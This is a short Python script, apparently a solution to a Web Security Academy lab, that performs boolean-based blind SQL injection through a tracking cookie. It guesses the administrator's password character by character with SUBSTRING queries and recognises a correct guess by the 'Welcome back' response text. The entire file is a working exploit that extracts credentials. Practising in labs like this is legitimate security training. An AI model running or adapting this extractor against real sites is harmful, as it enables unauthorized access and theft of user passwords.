#!/bin/python3
import requests
import urllib.parse

import re
import string

BASE_URL = 'https://0af50017041fc0ecc0d8e30700d5005b.web-security-academy.net'
RESPONSE_PATTERN = r"(Welcome\sback)"

COOKIE_TRACKING_ID = 'McPSQAKEZ9qpFiT0'
COOKIE_SESSION_ID  = 'TfJnAgKweszb4wWKdsB8UZyVjiIyhpfG'

def main():
    counter = pos = 1
    password = ''
    password_max_length = 30 

    session = requests.Session()
    print("Trying to guess the password", end = ' ', flush=True)

    while counter <= password_max_length:

        keep_running = False
        for char in string.printable:
            print('.', end='', flush=True)

            if char in ['\n', '\r', '\t']:
                continue
            elif char in [';', '+']:
                char = urllib.parse.quote(char)

            payload = f'\'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username=\'administrator\'),{pos},1)=\'{char}'

            cookies = {
                'TrackingId': f'{COOKIE_TRACKING_ID}{payload}',
                'session': COOKIE_SESSION_ID
            }

            response = session.get(url=BASE_URL, cookies=cookies)
            
            if bool(re.search(RESPONSE_PATTERN, response.text)):
                password += char
                pos += 1

                print(f'[{char}]', end='', flush=True)
                keep_running = True
                break
        
        if not keep_running:
            break

        counter += 1
        
    print(f'\n\nGuessed Password={password}')

if __name__ == "__main__":
    main()
